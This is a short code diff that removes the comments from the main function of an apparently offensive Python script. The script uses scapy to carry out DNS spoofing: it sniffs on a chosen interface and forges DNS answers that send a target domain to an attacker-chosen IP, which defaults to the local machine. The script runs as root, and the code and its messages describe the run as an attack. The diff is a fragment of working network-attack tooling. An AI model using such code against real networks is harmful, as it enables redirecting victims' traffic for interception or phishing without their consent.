@@ -42,7 +42,7 @@ def DNS_spoof(interface, domain, target, ip, stop_event):
 		sniff(iface=interface, prn=lambda pkt: packet_handler(pkt, domain, target, ip), store=0, count=1)
 
 def main():
-	# Parse the arguments
+
 	args = arg_parser()
 	interface = args.interface
 	if interface is None:
@@ -52,28 +52,28 @@ def main():
 	if domain is not None and domain[-1] != '.':
 		domain = domain+'.'
 	ip = args.ip
-	# If no IP has been set, use the local one
+	
 	if ip is None:
 		ip = [x[4] for x in scapy.all.conf.route.routes if (x[2] != "0.0.0.0" and x[3] == interface)][0]
 	
-	# Check whether we're root
+	
 	if (is_not_root()):
 		sys.exit("Please, run this script with superuser privileges.")
 	
-	# Creating the DNS spoofing thread
+	
 	stop_event = threading.Event()
 	dns=threading.Thread(target=DNS_spoof, args=(interface, domain, target, ip, stop_event))
 	dns.start()
 
-	# Wait for the user to end the attack
+	
 	try:
 		while True:
 			sleep(0.1)
 	except KeyboardInterrupt:
-		# Stop the threads (ARP and DNS spoofing)
+		
 		stop_event.set()
 
-	# Leave
+
 	dns.join()
 	print("Exiting!")
 
